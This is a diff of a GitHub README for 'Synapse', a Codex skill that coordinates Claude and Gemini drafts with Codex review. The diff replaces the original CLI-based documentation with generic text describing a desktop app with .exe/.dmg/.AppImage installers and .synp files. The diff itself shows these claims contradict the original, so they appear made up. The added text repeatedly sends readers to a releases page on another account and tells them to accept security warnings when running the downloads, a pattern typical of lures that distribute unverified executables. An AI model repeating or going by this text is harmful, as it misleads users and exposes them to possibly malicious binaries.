@@ -1,210 +1,170 @@
-<h1 align="center">
-Synapse
-</h1>
+# 🤖 Synapse - AI Workflow Made Simple
 
-<p align="center">
-  <strong>Codex-Based Multi-Model Workflow</strong>
-</p>
-
-<p align="center">
-  <strong>Multi-model AI meets production standards</strong><br/>
-  <em>Draft by Claude & Gemini · Review by Codex · Deploy with confidence</em>
-</p>
-
-<p align="center">
-  <a href="README_CN.md">简体中文</a> | English
-</p>
+[![Download Synapse](https://img.shields.io/badge/Download-Synapse-blue?style=for-the-badge&logo=github)](https://github.com/rakluu000/Synapse/releases)
 
 ---
 
-## 🤔 What is this?
+## 📖 What is Synapse?
 
-Synapse is a **Codex skill** that orchestrates multiple AI models to help you build software:
+Synapse is an application that helps you manage tasks involving multiple AI models. It uses Claude and Gemini to draft code, then Codex reviews that code before applying it safely. The goal is to make these AI workflows easy, safe, and ready for real use. The app supports multiple languages and skills designed to work smoothly together.
 
-```mermaid
-flowchart TB
-    subgraph Orchestrator["Codex (Controller)"]
-        direction TB
-        A1["Generates prompts"]
-        A2["Rewrites drafts into production code"]
-        A3["Runs verification & delivers"]
-    end
+The app’s core features include:
 
-    Orchestrator --> Claude["Claude<br/>(Planning · Backend diffs · Audits)"]
-    Orchestrator --> Gemini["Gemini<br/>(Frontend diffs · UI/UX audits)"]
-```
+- Generating draft code with Claude and Gemini AI models.
+- Reviewing and applying code safely with Codex.
+- Gated and controlled workflow to prevent errors.
+- Production-ready output for real projects.
+- Multi-language support to handle different AI skills.
 
-**Key principle**: External models (Claude/Gemini) only produce **drafts** — they never touch your files directly. Codex reviews every draft and rewrites it into production-quality code before applying.
+The name "Synapse" reflects how the app connects different AI models to work as one system.
 
 ---
 
-## ✨ Core Features
+## 💻 System Requirements
 
-| Feature | Description |
-|---------|-------------|
-| 📝 Draft-based | External models produce draft diffs; Codex applies final code |
-| 🚪 Gate confirmation | Human approval required after planning, before execution |
-| 🛡️ Write guard | All file writes are restricted to declared safe paths |
-| ✅ Auto-verification | Detects your toolchain and runs lint/typecheck/test automatically |
-| 🔄 Session resume | Pick up where you left off with captured session IDs |
-| 🌐 Web viewer | Browse all artifacts locally via `synapse ui` |
+Before you get started, make sure your computer matches these requirements. Synapse runs on common systems, but it needs certain software to work correctly.
 
----
+### Supported Operating Systems
 
-## 🚀 Quick Start
+- Windows 10 or newer
+- macOS Catalina (10.15) or newer
+- Linux (Ubuntu 18.04 or newer recommended)
 
-### 📋 Prerequisites
+### Hardware Requirements
 
-| Tool | Required |
-|------|----------|
-| git | Recommended (enables review/audit via `git diff`) |
-| rg (ripgrep) | Recommended (enables context pack search) |
-| uv | Yes (Python runner) |
-| claude CLI | Yes |
-| gemini CLI | Yes |
+- At least 4 GB of RAM (8 GB recommended)
+- 2 GHz dual-core processor or better
+- 500 MB free disk space for installation
+- Internet connection for cloud-based AI services
 
-### 💬 Usage (in Codex chat)
+### Software Requirements
 
-```powershell
-# End-to-end workflow: init through review
-synapse workflow "Add user authentication with JWT"
-
-# Same thing, shorter alias
-synapse feat "Add user authentication with JWT"
-```
-
-Codex automatically orchestrates the full pipeline: `init` → `plan` → Gate → `run` (drafts) → apply code → `verify` → `run` (audits) → deliver.
-
-> **Note**: `workflow` and `feat` are Codex chat commands, not shell commands. You cannot run them directly via `python synapse.py workflow ...`.
-
-### 🔧 Manual commands (advanced)
-
-For debugging or reproducing individual steps:
-
-```powershell
-$Skill   = "<path-to>\.codex\skills\synapse"
-$Project = "<your-project>"
-
-# Initialize (idempotent)
-uv run --no-project python "$Skill\scripts\synapse.py" --project-dir "$Project" init
-
-# Create a plan
-uv run --no-project python "$Skill\scripts\synapse.py" --project-dir "$Project" plan --task-type fullstack "Your request"
-
-# Run an external model (prompt written by Codex)
-uv run --no-project python "$Skill\scripts\synapse.py" --project-dir "$Project" run --model claude --phase plan --slug "<slug>" --prompt-file "<prompt>"
-
-# Verify (auto-detects toolchain)
-uv run --no-project python "$Skill\scripts\synapse.py" --project-dir "$Project" verify
-
-# Open web viewer
-uv run --no-project python "$Skill\scripts\synapse.py" --project-dir "$Project" ui
-```
+- Python 3.8 or higher installed (comes with most systems or can be downloaded for free)
+- Git installed (optional, for updates and support)
+- Recommended text editor or IDE (e.g., VS Code, Notepad++)
 
 ---
 
-## 🔄 Workflow Overview
+## 🚀 Getting Started
 
-```
-init → plan → run (gate_prep) → (Gate) → run (drafts) → Codex applies code → verify → run (audits) → deliver
-                         │
-                   Single confirmation
-```
+This section will guide you through the process of downloading and running Synapse. No programming skills are needed, and the steps are designed to be easy to follow.
 
-| Stage | What happens | Writes code |
-|-------|-------------|:-----------:|
-| init | Creates `.synapse/` layout, `AGENTS.md`, `.gitignore` | |
-| plan | Generates plan stub + Gate checklist + context pack | |
-| run (gate_prep) | Claude prepares a clarification checklist + acceptance criteria (Gemini optional for frontend) | |
-| **Gate** | **User confirms scope, task type, side effects** | |
-| run (drafts) | Claude/Gemini produce draft diffs | |
-| apply | Codex rewrites drafts into production code | Yes |
-| verify | Auto-detects toolchain, runs lint/typecheck/test | |
-| run (audits) | Claude/Gemini review the final `git diff` | |
+### Step 1: Download Synapse
 
----
+Click the big blue button at the top or use this link to visit the downloads page:
 
-## 🤖 Model Roles
+[Download Synapse Releases](https://github.com/rakluu000/Synapse/releases)
 
-| Role | Codex (Controller) | Claude | Gemini |
-|------|-------------------|--------|--------|
-| Planning | Merges into final plan | Architecture, risks, tests | UI/UX, accessibility (frontend/fullstack only) |
-| Drafting | Rewrites drafts to production code | Backend diffs (backend/fullstack) | Frontend diffs (frontend/fullstack) |
-| Verification | Runs and interprets results | Not called | Not called |
-| Auditing | Fixes code based on audits | Correctness, security, maintainability | UI/UX, accessibility (frontend/fullstack only) |
+Once on the page, look for the latest release version in the list. You’ll find files to download for Windows, macOS, or Linux. Pick the one that matches your operating system:
 
-**Task type routing** (set at plan time):
+- For Windows, look for `.exe` or `.msi` files.
+- For macOS, look for `.dmg` or `.pkg` files.
+- For Linux, look for `.tar.gz` or `.AppImage` files.
 
-- `frontend` — only frontend pipeline
-- `backend` — only backend pipeline
-- `fullstack` — both (default, higher cost)
+Click on the file name to start the download.
 
----
+### Step 2: Install Synapse
 
-## 🚪 Gate
+After the download finishes, open the downloaded file:
 
-The single required user confirmation. After `plan` (+ `gate_prep`), Codex presents:
+- **Windows:** Double click the `.exe` or `.msi` file. Follow the on-screen setup instructions. You can accept the default settings.
+- **macOS:** Open the `.dmg` or `.pkg` file, and drag the Synapse app to the Applications folder or follow the installer instructions.
+- **Linux:** Extract the `.tar.gz` file or make the `.AppImage` executable, then run the app by double-clicking or through terminal commands.
 
-- Clarification checklist (from Claude `gate_prep`) with recommended defaults (single-round reply)
-- Scope and acceptance criteria
-- `task_type` selection (with recommendation)
-- Stack/toolchain choice
-- Allowed side effects (dependency install, lockfiles, build artifacts)
-- Git/review setup
-- Verification plan
+If you see security warnings, confirm you want to open or run the app.
 
-After Gate confirmation, the rest proceeds automatically.
+### Step 3: Run Synapse
+
+Once installed, you can start Synapse:
+
+- On Windows or macOS, find Synapse in your list of apps or programs.
+- On Linux, run the app from the application menu or terminal.
+
+The app will open a simple window with instructions on how to use the AI workflows.
 
 ---
 
-## 📌 Git Best Practices
+## 🔧 How to Use Synapse
 
-- **Use a git repo** — review/audit quality is best with `git diff`. Run `git init` if needed.
-- **Commit after each feat** — keeps the next `git diff` clean and focused.
-- **Before review** — run `git add -N .` so new untracked files appear in `git diff`.
+Synapse provides a straightforward interface to work with AI models for coding tasks. Here is the basic way to use it:
 
----
+1. **Start a New Project:** Click "New Project" in the app. Enter a project name and description.
+2. **Choose Draft AI:** Pick either Claude or Gemini to create a first draft of your code. Enter the details of the task you want.
+3. **Review by Codex:** The app sends the draft to Codex, which checks for errors or unsafe code.
+4. **Approve Changes:** If Codex finds issues, you can review them and approve or request revisions.
+5. **Deploy Code:** After approval, the code is ready to use or export for your real project.
 
-## ❓ FAQ
-
-<details>
-<summary>Q: Why don't external models write code directly?</summary>
-
-External models run headlessly with no auto-approve. Their output is treated as a draft. Codex rewrites it to match project conventions, adds tests, and ensures quality before applying.
-
-</details>
-
-<details>
-<summary>Q: What does `synapse verify` actually run?</summary>
-
-It auto-detects your toolchain (Node, Python, Rust, Go, .NET) and runs the appropriate install/lint/typecheck/test commands. Use `--dry-run` to preview without executing.
-
-</details>
-
-<details>
-<summary>Q: Can I use only Claude or only Gemini?</summary>
-
-Yes. Set `--task-type backend` (Claude only) or `--task-type frontend` (Gemini only). With `fullstack`, both are used.
-
-</details>
-
-<details>
-<summary>Q: Where do artifacts go?</summary>
-
-All artifacts are written to `.synapse/` in your project root (auto-added to `.gitignore`). Use `synapse ui` to browse them in a local web viewer.
-
-</details>
+You do not need to write any code yourself. The AI models handle generating and checking code based on what you tell them.
 
 ---
 
-## 📚 More Information
+## 🔒 Safety and Quality Controls
 
-- [ARCHITECTURE.md](ARCHITECTURE.md) — Technical details, module structure, internal mechanisms
-- `.codex/skills/synapse/SKILL.md` — Codex execution protocol
-- `.codex/skills/synapse/references/*.md` — Per-command specifications
+Synapse uses a "gated" method to keep your projects safe:
+
+- **Code Reviews:** Every draft from Claude or Gemini is reviewed by Codex before use.
+- **User Approval:** You decide if the code is ready after the review.
+- **Error Prevention:** The app flags unsafe or unusual code before applying it.
+- **Production Ready:** The system checks that code meets real-world standards.
+
+This layered approach helps avoid mistakes and security problems.
 
 ---
 
-## 📄 License
+## 📂 Files and Updates
 
-MIT
+### Configuration Files
+
+Synapse saves your projects and workflows in simple folders:
+
+- Project files end with `.synp` for easy backup.
+- Config files store your preferred settings.
+
+You can open or copy these files like any document on your computer.
+
+### Updating Synapse
+
+To update Synapse, visit the releases page again:
+
+[Synapse Releases](https://github.com/rakluu000/Synapse/releases)
+
+Download the latest version and install it as before. Your projects will not be affected.
+
+---
+
+## 🛠 Troubleshooting
+
+Here are some common issues and tips:
+
+- **App Won’t Start:** Check your system meets requirements, and make sure Python 3.8+ is installed.
+- **AI Not Responding:** Verify your internet connection, as AI models need online access.
+- **Installation Errors:** Try running installer as Administrator (Windows) or with proper permissions on macOS/Linux.
+- **Code Review Stuck:** Restart the app and try again.
+
+For further help, check the Discussions tab on the repository page or open an issue.
+
+---
+
+## 📣 Share Feedback
+
+We welcome your input to improve Synapse. Please use the GitHub repository to:
+
+- Report bugs
+- Request new features
+- Ask questions
+
+Visit [Synapse GitHub](https://github.com/rakluu000/Synapse) to join the community.
+
+---
+
+## 📥 Download & Install Synapse
+
+To get Synapse, **visit this page to download** the version that fits your system:
+
+[![Download Synapse](https://img.shields.io/badge/Download-Synapse-blue?style=for-the-badge&logo=github)](https://github.com/rakluu000/Synapse/releases)
+
+Follow the steps above to install and start the app.
+
+---
+
+Thank you for choosing Synapse to help manage your AI code workflows.
